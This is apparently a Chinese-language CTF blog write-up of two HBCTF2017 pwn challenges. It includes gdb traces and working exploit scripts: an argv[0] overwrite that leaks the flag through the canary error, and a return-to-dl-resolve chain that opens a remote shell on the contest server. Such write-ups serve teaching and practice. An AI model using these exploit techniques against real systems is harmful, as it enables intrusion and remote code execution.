---
layout: post
title:  "HBCTF2017(1)writup"
date:   2017-04-08 11:49:45 +0200
categories: ctf
published: true
---
这次比赛怼了两道pwn，学习了挺多。

### 0x00 pwn100--whatiscanary

首先 `checksec`查看防护级别。

```bash
root@kali:~/Desktop# checksec whatiscanary 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[*] '/root/Desktop/whatiscanary'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

具有got表写权限，无栈地址随机，有栈保护canary。canary简单解释就是在栈底之前由系统生成随机数据，在函数返回时检查这些数据有没有被更改，如果被更改会抛出异常结束程序。这么一来rop是搞不成了，不过能钻别的空子。先来找程序的溢出点。

```c
int __cdecl sub_804878A(int a1)
{
  int result; // eax@3
  char v2; // [sp+Bh] [bp-Dh]@2
  int i; // [sp+Ch] [bp-Ch]@1

  for ( i = 0; ; ++i )
  {
    v2 = getchar();
    if ( v2 == 10 )
      break;
    *(_BYTE *)(a1 + i) = v2;
  }
  result = i + a1;
  *(_BYTE *)(i + a1) = 0;
  return result;
}
```

这里的 `a1`是从前面函数传进来一个局部变量，这里只要输入不为换行符（ASCII为10）就会一直读入，明显是个溢出点。然后看调用它的函数。

```c
int sub_80487C9()
{
  char s; // [sp+Ch] [bp-2Ch]@1
  int v2; // [sp+2Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  printf("input your name(length < 10):");
  sub_804878A((int)&s);
  if ( (signed int)strlen(&s) > 10 )
  {
    puts("error, will exit!");
    exit(0);
  }
  printf("hello, '%s', wish you have a good result!\n", &s);
  return *MK_FP(__GS__, 20) ^ v2;
}
```

这里需要绕过 `strlen()` 的判断，所以在输入时注意及时加入结束符0.

<br/>

现在回到canary的话题。在显示错误信息时，程序会显示文件名，而文件名这个变量是由main函数的argv[0]存储的。另外注意到这个程序在main函数中把flag的内容读到的全局变量 `&unk_804A0A0` 中，所以把argv[0]的内容换成这个全局变量就能输出flag了。

<br/>

写payload的思路就这样了，难点还有就是找到argv[0]的偏移。从ida pro的反编译中可以看到输入变量与ebp的距离是0x2c，那么现在目标是找到ebp指向地址以及argv[0]地址。下个断点看看就行。

```bash
gdb-peda$ file whatiscanary 
Reading symbols from whatiscanary...(no debugging symbols found)...done.
gdb-peda$ b *(0x080487FF)
Breakpoint 1 at 0x80487ff
gdb-peda$ r
Starting program: /root/Desktop/whatiscanary 
hello, welcome to HBCTF!
input your name(length < 10):asdfasdf

 [----------------------------------registers-----------------------------------]
EAX: 0xbffff3bc ("asdfasdf")
EBX: 0x0 
ECX: 0xa ('\n')
EDX: 0x8 
ESI: 0xb7fb3000 --> 0x1aedb0 
EDI: 0xb7fb3000 --> 0x1aedb0 
EBP: 0xbffff3e8 --> 0xbffff3f8 --> 0x0 
ESP: 0xbffff3a4 --> 0xb7fb3000 --> 0x1aedb0 
EIP: 0x80487ff (push   eax)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80487f6:   add    esp,0x10
   0x80487f9:   sub    esp,0xc
   0x80487fc:   lea    eax,[ebp-0x2c]
=> 0x80487ff:   push   eax
   0x8048800:   call   0x80485b0 <strlen@plt>
   0x8048805:   add    esp,0x10
   0x8048808:   mov    DWORD PTR [ebp-0x30],eax
   0x804880b:   cmp    DWORD PTR [ebp-0x30],0xa
[------------------------------------stack-------------------------------------]
0000| 0xbffff3a4 --> 0xb7fb3000 --> 0x1aedb0 
0004| 0xbffff3a8 --> 0xbffff3d8 --> 0xbffff3f8 --> 0x0 
0008| 0xbffff3ac --> 0x8048779 (add    esp,0x10)
0012| 0xbffff3b0 --> 0x804b008 --> 0xfbad240c 
0016| 0xbffff3b4 --> 0x8 
0020| 0xbffff3b8 --> 0x9 ('\t')
0024| 0xbffff3bc ("asdfasdf")
0028| 0xbffff3c0 ("asdf")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x080487ff in ?? ()
gdb-peda$ stack 30
0000| 0xbffff3a4 --> 0xb7fb3000 --> 0x1aedb0 
0004| 0xbffff3a8 --> 0xbffff3d8 --> 0xbffff3f8 --> 0x0 
0008| 0xbffff3ac --> 0x8048779 (add    esp,0x10)
0012| 0xbffff3b0 --> 0x804b008 --> 0xfbad240c 
0016| 0xbffff3b4 --> 0x8 
0020| 0xbffff3b8 --> 0x9 ('\t')
0024| 0xbffff3bc ("asdfasdf")
0028| 0xbffff3c0 ("asdf")
0032| 0xbffff3c4 --> 0xb7feff00 (<_dl_runtime_resolve>: push   eax)
0036| 0xbffff3c8 --> 0x804b008 --> 0xfbad240c 
0040| 0xbffff3cc --> 0x9 ('\t')
0044| 0xbffff3d0 --> 0xb7fb3000 --> 0x1aedb0 
0048| 0xbffff3d4 --> 0xb7fb3000 --> 0x1aedb0 
0052| 0xbffff3d8 --> 0xbffff3f8 --> 0x0 
0056| 0xbffff3dc --> 0x647c2c00 ('')
0060| 0xbffff3e0 --> 0x804a0a0 ("asdfadsf\n")
0064| 0xbffff3e4 --> 0x0 
0068| 0xbffff3e8 --> 0xbffff3f8 --> 0x0 
0072| 0xbffff3ec --> 0x80488c5 (sub    esp,0xc)
0076| 0xbffff3f0 --> 0xb7fb33dc --> 0xb7fb41e0 --> 0x0 
0080| 0xbffff3f4 --> 0xbffff410 --> 0x1 
0084| 0xbffff3f8 --> 0x0 
0088| 0xbffff3fc --> 0xb7e1c5f7 (<__libc_start_main+247>:   add    esp,0x10)
0092| 0xbffff400 --> 0xb7fb3000 --> 0x1aedb0 
0096| 0xbffff404 --> 0xb7fb3000 --> 0x1aedb0 
--More--(25/30) 
0100| 0xbffff408 --> 0x0 
0104| 0xbffff40c --> 0xb7e1c5f7 (<__libc_start_main+247>:   add    esp,0x10)
0108| 0xbffff410 --> 0x1 
0112| 0xbffff414 --> 0xbffff4a4 --> 0xbffff624 ("/root/Desktop/whatiscanary")
0116| 0xbffff418 --> 0xbffff4ac --> 0xbffff63f ("XDG_VTNR=2")
```

正好看到，argv[0]的地址应该是0xbffff4a4。然后在寄存器栏也能看到ebp的地址是0xbffff3e8。脚本就出来了。

```python
from pwn import *

pwn = remote('123.206.81.66',7777)

payload = 'a'*3 + '\x00'*(0x2C-3) + 'a'*(0xbffff4a4 - 0xbffff3e8) + p32(0x0804A0A0)   + '\x0A'

pwn.recvuntil("10):")
pwn.send(payload)
pwn.recvuntil("result!\n")

re = pwn.recv()

print re
```

结果是

```bash
root@kali:~/Desktop# python p.py
[+] Opening connection to 123.206.81.66 on port 7777: Done
*** stack smashing detected ***: hbctf{05162613b1e4dad2}
 terminated

[*] Closed connection to 123.206.81.66 port 7777

```

### 0x01 pwn200--infoless.infoless

这个程序非常干净。plt表里就一个read函数，漏洞也非常明显，就一个栈溢出。

```c
ssize_t sub_80484CB()
{
  char buf; // [sp+6h] [bp-12h]@1

  return read(0, &buf, 0x3Cu);
}
```

可以说非常暴力了。一开始陷入了僵局，因为没有wirte函数来泄露地址，后来得知了Return-to-dl-resolve这个漏洞利用方法可以只用read拿shell。

<br/>

详细原理可以看这个文章[ROP之return to dl-resolve](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)。讲得非常详细。

<br/>

简单的说就是利用函数在动态链接时需要读取符号表的信息来获取系统函数的原理，提供伪造的符号表索引并伪造符号表达到任意调用系统函数的目标，确实是非常暴力的手段了。

<br/>

对此网上已经有大牛写好了集成了工具并写好了漏洞利用脚本，用的时候改改就成了。工具的名字叫[roputils](https://github.com/inaz2/roputils).

改好的脚本：

```python
from roputils import *

fpath = './infoless.infoless'
offset = 0x12

rop = ROP(fpath)
addr_bss = rop.section('.bss')

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

p = Proc(host='123.206.81.66', port=8888)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

p.write(buf)
p.interact(0)
```

结果是

```bash
root@kali:~/roputils# python pp.py
[+] read: ''
got a shell!
ls
bin
flag
infoless
lib
cat flag
hbctf{8a6d0b8bff7581ac}
```
